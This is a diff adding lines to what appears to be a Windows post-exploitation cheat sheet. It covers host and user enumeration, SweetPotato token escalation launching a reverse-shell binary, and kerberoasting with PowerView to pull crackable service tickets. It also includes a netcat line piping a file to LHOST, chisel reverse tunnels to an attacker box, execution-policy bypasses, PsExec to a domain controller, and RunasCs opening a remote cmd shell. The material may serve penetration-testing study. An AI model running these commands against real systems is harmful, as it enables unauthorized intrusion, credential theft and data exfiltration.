@@ -7,6 +7,7 @@ wmic product get name, version, vendor # installed software
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path # enum kernel/driver
 Get-Process -IncludeUserName | Select-Object Id,Name,Username,Path | Format-List
 cmd /c ver
+set
 
 # users
 whoami /all
@@ -33,6 +34,8 @@ schtasks /query /fo LIST /v
 schtasks
 
 # files
+ls -h 'C:\$Recycle.Bin\'
+dir /a C:\users C:\ "C:\Program Files" "C:\Program Files (x86)"
 accesschk.exe -uws "Everyone" "C:\Program Files"
 mountvol
 dir /S /B
@@ -114,6 +117,11 @@ rdesktop "$rhost"
 # tokens
 .\SweetPotato.exe -p rev.exe
 
+# kerberoasting
+## powerview.ps1
+Get-NetUser -SPN | select serviceprincipalname
+Request-SPNTicket -SPN "some_spn" -Format Hashcat
+
 # other
 type important_file.txt | nc.exe LHOST LPORT
 powershell.exe -executionpolicy bypass -file some_file.ps1
@@ -122,3 +130,5 @@ powershell.exe Start-Process cmd.exe -Verb runAs
 .\chisel_win64.exe client kali-docker:9999 R:socks
 .\chisel_win64.exe client kali-docker:9999 R:5555:127.0.0.1:3306 # listen on kali 5555 and forward to victim to localhost on port 3306
 .\PsExec64.exe \\dc cmd.exe
+Set-ExecutionPolicy -ExecutionPolicy ByPass -Scope CurrentUser 
+. .\Invoke-RunasCs.ps1 && Invoke-RunasCs some_user some_password -d some.domain -command cmd.exe -remote kali-docker:port
